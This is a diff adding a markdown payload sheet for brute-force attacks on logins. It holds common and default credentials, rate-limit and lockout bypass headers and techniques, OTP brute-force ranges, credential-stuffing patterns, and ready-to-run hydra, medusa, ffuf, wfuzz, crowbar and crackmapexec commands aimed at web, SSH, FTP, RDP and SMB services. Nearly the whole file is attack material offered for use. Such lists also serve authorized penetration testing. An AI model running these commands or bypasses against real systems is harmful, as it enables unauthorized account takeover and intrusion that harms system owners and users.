@@ -1,0 +1,310 @@
+# Brute Force Payloads
+
+## ========================================
+## COMMON PASSWORDS
+## ========================================
+
+password
+Password1
+password123
+admin
+admin123
+12345678
+qwerty
+letmein
+welcome
+monkey
+dragon
+master
+sunshine
+princess
+football
+baseball
+abc123
+trustno1
+password1
+
+## ========================================
+## DEFAULT CREDENTIALS
+## ========================================
+
+# Admin accounts
+admin:admin
+admin:password
+admin:123456
+administrator:password
+root:root
+root:toor
+
+# Common services
+admin:admin123
+user:user
+test:test
+guest:guest
+demo:demo
+
+## ========================================
+## USERNAME ENUMERATION
+## ========================================
+
+admin
+administrator
+root
+user
+test
+guest
+demo
+support
+webmaster
+info
+contact
+
+## ========================================
+## RATE LIMIT BYPASS
+## ========================================
+
+# IP rotation
+Use proxy rotation
+VPN switching
+Tor network
+
+# Header manipulation
+X-Forwarded-For: random_ip
+X-Originating-IP: random_ip
+X-Remote-IP: random_ip
+X-Remote-Addr: random_ip
+
+# Session/Token rotation
+Use different session per request
+Rotate CSRF tokens
+
+## ========================================
+## ACCOUNT LOCKOUT BYPASS
+## ========================================
+
+# Multiple usernames
+Distribute attempts across accounts
+admin:pass1
+user:pass1
+test:pass1
+
+# Case variations
+Admin
+ADMIN
+aDmIn
+
+## ========================================
+## TIMING ATTACKS
+## ========================================
+
+# Username enumeration
+Valid user: 200ms response
+Invalid user: 50ms response
+
+# Password validation
+Measure response time differences
+
+## ========================================
+## WEAK PIN CODES
+## ========================================
+
+0000
+1111
+2222
+1234
+4321
+0123
+9999
+1212
+7777
+
+## ========================================
+## 2FA/OTP BRUTE FORCE
+## ========================================
+
+# 4-digit OTP
+0000-9999 (10,000 attempts)
+
+# 6-digit OTP
+000000-999999 (1,000,000 attempts)
+
+# Common OTP codes
+123456
+000000
+111111
+654321
+
+## ========================================
+## API KEY BRUTE FORCE
+## ========================================
+
+# Predictable patterns
+api_key_1
+api_key_2
+sk_live_xxxxx
+pk_test_xxxxx
+
+## ========================================
+## TOKEN BRUTE FORCE
+## ========================================
+
+# Short tokens
+abc123
+abc124
+abc125
+
+# Numeric tokens
+100001
+100002
+100003
+
+## ========================================
+## WORDLISTS
+## ========================================
+
+# Top passwords
+rockyou.txt
+common-passwords.txt
+10-million-password-list-top-1000000.txt
+
+# Username lists
+common-usernames.txt
+top-usernames-shortlist.txt
+
+## ========================================
+## CREDENTIAL STUFFING
+## ========================================
+
+# Use leaked credentials
+email:password pairs from breaches
+username:password combinations
+
+# Common patterns
+firstname.lastname@company.com:Password123
+user@domain.com:Company2023!
+
+## ========================================
+## TOOLS & COMMANDS
+## ========================================
+
+# Hydra
+hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# Medusa
+medusa -h target.com -u admin -P passwords.txt -M http
+
+# Burp Intruder
+Set username/password as insertion points
+Load wordlist
+Analyze responses
+
+# ffuf
+ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt
+
+# wfuzz
+wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" http://target.com/login
+
+## ========================================
+## API BRUTE FORCE
+## ========================================
+
+# REST API
+curl -X POST http://target.com/api/login -d '{"username":"admin","password":"FUZZ"}'
+
+# GraphQL
+{"query":"mutation{login(username:\"admin\",password:\"FUZZ\"){token}}"}
+
+## ========================================
+## SSH BRUTE FORCE
+## ========================================
+
+# Hydra SSH
+hydra -l root -P passwords.txt ssh://target.com
+
+# Common SSH credentials
+root:root
+root:toor
+admin:admin
+
+## ========================================
+## FTP BRUTE FORCE
+## ========================================
+
+# Hydra FTP
+hydra -l admin -P passwords.txt ftp://target.com
+
+# Anonymous FTP
+anonymous:anonymous
+ftp:ftp
+
+## ========================================
+## RDP BRUTE FORCE
+## ========================================
+
+# Hydra RDP
+hydra -l Administrator -P passwords.txt rdp://target.com
+
+# crowbar
+crowbar -b rdp -s target.com/32 -u admin -C passwords.txt
+
+## ========================================
+## SMB BRUTE FORCE
+## ========================================
+
+# crackmapexec
+crackmapexec smb target.com -u admin -p passwords.txt
+
+# Hydra SMB
+hydra -l admin -P passwords.txt smb://target.com
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Null byte
+username=admin%00&password=test
+
+# Parameter pollution
+username=admin&username=root&password=test
+
+# Case manipulation
+Username=admin
+USERNAME=ADMIN
+
+# Unicode normalization
+admin → ᴀdmin
+
+## ========================================
+## SMART BRUTE FORCE
+## ========================================
+
+# Company-specific patterns
+CompanyName2023!
+CompanyName@123
+Welcome2023
+
+# Season-based
+Summer2023!
+Winter2023!
+
+# Keyboard patterns
+qwerty123
+asdfgh123
+zxcvbn123
+
+## ========================================
+## MITIGATION DETECTION
+## ========================================
+
+# Captcha present
+Requires captcha solving
+
+# Rate limiting
+429 Too Many Requests
+Exponential backoff
+
+# Account lockout
+Account locked after N attempts
+
+# IP blocking
+403 Forbidden from IP
